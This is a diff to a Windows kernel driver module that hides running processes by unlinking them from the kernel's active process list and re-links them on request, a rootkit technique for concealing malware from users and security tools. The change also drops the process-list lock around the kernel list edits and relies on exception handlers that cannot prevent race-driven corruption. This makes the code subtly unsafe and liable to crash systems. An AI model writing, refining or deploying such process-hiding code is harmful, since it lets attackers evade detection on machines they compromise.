@@ -1,6 +1,6 @@
+#include <ntddk.h>
 #include "ProcessModule.h"
 #include "Offsets.h"
-#include <ntddk.h>
 
 NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(HANDLE ProcessId,
                                                 PEPROCESS *Process);
@@ -22,17 +22,21 @@ static BOOLEAN IsValidProcessId(ULONG ProcessId) {
   return ProcessId > SYSTEM_PROCESS_PID;
 }
 
-static BOOLEAN IsProcessHidden(ULONG ProcessId) {
-  BOOLEAN found = FALSE;
+static BOOLEAN IsProcessHiddenLocked(ULONG ProcessId) {
   ULONG i;
-
-  ExAcquireFastMutex(&g_HiddenListLock);
   for (i = 0; i < g_HiddenProcessCount; i++) {
     if (g_HiddenProcesses[i].ProcessId == ProcessId) {
-      found = TRUE;
-      break;
+      return TRUE;
     }
   }
+  return FALSE;
+}
+
+static BOOLEAN IsProcessHidden(ULONG ProcessId) {
+  BOOLEAN found;
+
+  ExAcquireFastMutex(&g_HiddenListLock);
+  found = IsProcessHiddenLocked(ProcessId);
   ExReleaseFastMutex(&g_HiddenListLock);
 
   return found;
@@ -43,7 +47,7 @@ static BOOLEAN AddHiddenProcess(ULONG ProcessId, PLIST_ENTRY OriginalLinks) {
 
   ExAcquireFastMutex(&g_HiddenListLock);
 
-  if (IsProcessHidden(ProcessId))
+  if (IsProcessHiddenLocked(ProcessId))
     goto exit;
 
   if (g_HiddenProcessCount >= MAX_HIDDEN_PROCESSES)
@@ -110,13 +114,12 @@ NTSTATUS ProcessHide(ULONG ProcessId) {
   NTSTATUS status = STATUS_SUCCESS;
   PEPROCESS targetProcess = NULL;
   ULONG activeLinksOffset = GetActiveProcessLinksOffset();
-  ULONG lockOffset = GetProcessLockOffset();
 
   if (!IsValidProcessId(ProcessId))
     return STATUS_INVALID_PARAMETER;
 
   // Build/architecture not supported by the offset table.
-  if (activeLinksOffset == 0 || lockOffset == 0)
+  if (activeLinksOffset == 0)
     return STATUS_UNSUCCESSFUL;
 
   if (IsProcessHidden(ProcessId))
@@ -128,32 +131,26 @@ NTSTATUS ProcessHide(ULONG ProcessId) {
 
   PLIST_ENTRY processListEntry =
       (PLIST_ENTRY)((PUCHAR)targetProcess + activeLinksOffset);
-  PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((PUCHAR)targetProcess + lockOffset);
 
   if (!AddHiddenProcess(ProcessId, processListEntry)) {
     ObDereferenceObject(targetProcess);
     return STATUS_INSUFFICIENT_RESOURCES;
   }
 
-  // Guard the list manipulation with the process list lock.
-  ExAcquirePushLockExclusive(listLock);
-
   __try {
     RemoveEntryList(processListEntry);
+
+    // Isolate the unlinked node as a self-loop so nothing can walk through it.
+    processListEntry->Flink = processListEntry;
+    processListEntry->Blink = processListEntry;
   } __except (EXCEPTION_EXECUTE_HANDLER) {
     status = GetExceptionCode();
     RemoveHiddenProcess(ProcessId);
-    ExReleasePushLockExclusive(listLock);
     ObDereferenceObject(targetProcess);
     DbgPrint("Hide process %lu faulted: 0x%X\n", ProcessId, status);
     return status;
   }
 
-  // Isolate the unlinked node as a self-loop so nothing can walk through it.
-  processListEntry->Flink = processListEntry;
-  processListEntry->Blink = processListEntry;
-
-  ExReleasePushLockExclusive(listLock);
   ObDereferenceObject(targetProcess);
 
   DbgPrint("Hidden process %lu.\n", ProcessId);
@@ -165,28 +162,27 @@ NTSTATUS ProcessHide(ULONG ProcessId) {
 NTSTATUS ProcessUnhide(ULONG ProcessId) {
   NTSTATUS status = STATUS_SUCCESS;
   PEPROCESS systemProcess = NULL;
-  PHIDDEN_PROCESS_ENTRY entry = NULL;
   ULONG activeLinksOffset = GetActiveProcessLinksOffset();
-  ULONG lockOffset = GetProcessLockOffset();
   ULONG i;
 
   if (!IsValidProcessId(ProcessId))
     return STATUS_INVALID_PARAMETER;
 
-  if (activeLinksOffset == 0 || lockOffset == 0)
+  if (activeLinksOffset == 0)
     return STATUS_UNSUCCESSFUL;
 
   // Resolve the saved list node for the given PID.
+  PLIST_ENTRY originalLinks = NULL;
   ExAcquireFastMutex(&g_HiddenListLock);
   for (i = 0; i < g_HiddenProcessCount; i++) {
     if (g_HiddenProcesses[i].ProcessId == ProcessId) {
-      entry = &g_HiddenProcesses[i];
+      originalLinks = g_HiddenProcesses[i].OriginalLinks;
       break;
     }
   }
   ExReleaseFastMutex(&g_HiddenListLock);
 
-  if (!entry)
+  if (!originalLinks)
     return STATUS_NOT_FOUND;
 
   // Anchor the insert at the System process, the head of the active list.
@@ -197,11 +193,16 @@ NTSTATUS ProcessUnhide(ULONG ProcessId) {
 
   PLIST_ENTRY processListEntry =
       (PLIST_ENTRY)((PUCHAR)systemProcess + activeLinksOffset);
-  PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((PUCHAR)systemProcess + lockOffset);
 
-  ExAcquirePushLockExclusive(listLock);
-  InsertHeadList(processListEntry, entry->OriginalLinks);
-  ExReleasePushLockExclusive(listLock);
+  __try {
+    InsertHeadList(processListEntry, originalLinks);
+  } __except (EXCEPTION_EXECUTE_HANDLER) {
+    status = GetExceptionCode();
+    ObDereferenceObject(systemProcess);
+    DbgPrint("Unhide process %lu faulted: 0x%X\n", ProcessId, status);
+    return status;
+  }
+
   ObDereferenceObject(systemProcess);
 
   RemoveHiddenProcess(ProcessId);
